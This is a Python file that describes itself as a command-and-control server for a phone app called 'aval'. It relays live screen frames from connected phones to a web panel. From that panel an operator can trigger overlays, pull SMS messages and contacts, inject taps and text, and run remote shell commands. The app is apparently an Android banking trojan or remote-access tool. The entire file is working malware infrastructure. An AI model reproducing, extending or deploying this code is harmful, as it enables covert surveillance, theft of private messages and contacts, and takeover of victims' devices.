# server.py - C2 local para o app aval
import asyncio, base64, json, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import websockets

LOOP = None
PHONES = set()
VIEWERS = set()
INFO = {}

PAGE = r"""<!doctype html><html><head><meta charset="utf-8"><title>aval</title>
<style>
body{margin:0;background:#111;color:#ddd;font:13px system-ui;display:flex;height:100vh}
#left{flex:1;display:flex;flex-direction:column;min-width:0}
#bar{padding:6px;display:flex;gap:4px;flex-wrap:wrap;background:#1b1b1b}
button{background:#2b2b2b;color:#ddd;border:1px solid #444;padding:4px 8px;cursor:pointer}
button:hover{background:#3a3a3a}
#img{flex:1;object-fit:contain;background:#000;min-height:0;cursor:crosshair}
#right{width:320px;display:flex;flex-direction:column;border-left:1px solid #333}
#log{flex:1;overflow:auto;padding:6px;font:11px monospace;white-space:pre-wrap;word-break:break-all}
#row{padding:6px;display:flex;gap:4px;align-items:center}
input[type=text]{flex:1;background:#222;color:#ddd;border:1px solid #444;padding:5px}
</style></head><body>
<div id="left">
<div id="bar">
<button onclick="k(4)">Voltar</button><button onclick="k(3)">Home</button><button onclick="k(187)">Recentes</button>
<button onclick="cmd('shot',{on:true})">Print ON</button><button onclick="cmd('shot',{on:false})">Print OFF</button>
<button onclick="cmd('ov',{on:true})">Overlay ON</button><button onclick="cmd('ov',{on:false})">Overlay OFF</button>
<button onclick="cmd('screen',{on:true})">Acordar</button>
<button onclick="cmd('sms',{})">SMS</button><button onclick="cmd('contacts',{})">Contatos</button>
</div>
<img id="img">
<div id="row"><input id="txt" type="text" placeholder="texto, ou $comando para shell"><button onclick="send()">Enviar</button></div>
</div>
<div id="right">
<div id="row">Qualidade<input id="q" type="range" min="15" max="90" value="38" oninput="cmd('q',{v:+this.value})"></div>
<div id="row">FPS<input id="f" type="range" min="1" max="15" value="8" oninput="cmd('fps',{v:+this.value})"></div>
<div id="log"></div>
</div>
<script>
let ws,info={w:0,h:0};
const img=document.getElementById('img'),log=document.getElementById('log');
function add(s){log.textContent+=s+"\n";log.scrollTop=log.scrollHeight}
function connect(){
ws=new WebSocket('ws://'+location.hostname+':8081');
ws.onopen=()=>add('[painel conectado]');
ws.onclose=()=>{add('[desconectado]');setTimeout(connect,2000)};
ws.onmessage=e=>{const m=JSON.parse(e.data);
  if(m.k==='frame'){img.src='data:image/jpeg;base64,'+m.d}
  else if(m.k==='log'){const d=m.d;
   if(d.t==='hello'){info=d;add('['+d.id+'] '+d.m+' sdk'+d.sdk+' '+d.w+'x'+d.h+' bat'+d.bat)}
   else add(d.t+': '+(d.o||''))}};
}
function cmd(c,x){if(ws&&ws.readyState===1)ws.send(JSON.stringify(Object.assign({c},x)))}
function k(code){cmd('key',{code})}
function send(){const t=document.getElementById('txt'),v=t.value.trim();if(!v)return;
v[0]==='$'?cmd('shell',{cmd:v.slice(1)}):cmd('text',{s:v});t.value=''}
document.getElementById('txt').addEventListener('keydown',e=>{if(e.key==='Enter')send()});
function pt(ev){const r=img.getBoundingClientRect();
const sx=info.w&&img.naturalWidth?info.w/img.naturalWidth:1;
const sy=info.h&&img.naturalHeight?info.h/img.naturalHeight:1;
return{x:Math.round((ev.clientX-r.left)*(img.naturalWidth/r.width)*sx),
        y:Math.round((ev.clientY-r.top)*(img.naturalHeight/r.height)*sy)}}
let down=null;
img.addEventListener('mousedown',e=>{down=pt(e)});
img.addEventListener('mouseup',e=>{const u=pt(e);if(!down)return;
Math.abs(u.x-down.x)<12&&Math.abs(u.y-down.y)<12
  ?cmd('touch',{x:u.x,y:u.y})
  :cmd('swipe',{x1:down.x,y1:down.y,x2:u.x,y2:u.y,ms:260});down=null});
connect();
</script></body></html>"""
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        b = PAGE.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)
    def log_message(self, *a): pass

def push(o):
    if not VIEWERS or LOOP is None: return
    d = json.dumps(o)
    for v in list(VIEWERS):
        asyncio.run_coroutine_threadsafe(v.send(d), LOOP)

async def phone(ws):
    PHONES.add(ws)
    print("+ celular conectado")
    push({"k": "log", "d": {"t": "info", "o": "celular conectado"}})
    try:
        async for m in ws:
            if isinstance(m, bytes):
                push({"k": "frame", "d": base64.b64encode(m).decode()})
            else:
                try: o = json.loads(m)
                except Exception: o = {"t": "raw", "o": m}
                if o.get("t") == "hello": INFO.update(o)
                push({"k": "log", "d": o})
    finally:
        PHONES.discard(ws)
        print("- celular desconectado")
        push({"k": "log", "d": {"t": "info", "o": "celular desconectado"}})

async def viewer(ws):
    VIEWERS.add(ws)
    try:
        async for m in ws:
            for p in list(PHONES):
                try: await p.send(m)
                except Exception: pass
    finally:
        VIEWERS.discard(ws)

async def main():
    global LOOP
    LOOP = asyncio.get_running_loop()
    threading.Thread(
        target=lambda: HTTPServer(("0.0.0.0", 8082), H).serve_forever(), daemon=True
    ).start()
    async with websockets.serve(phone, "0.0.0.0", 8080), websockets.serve(viewer, "0.0.0.0", 8081):
        print("painel -> http://localhost:8082")
        await asyncio.Future()

asyncio.run(main())
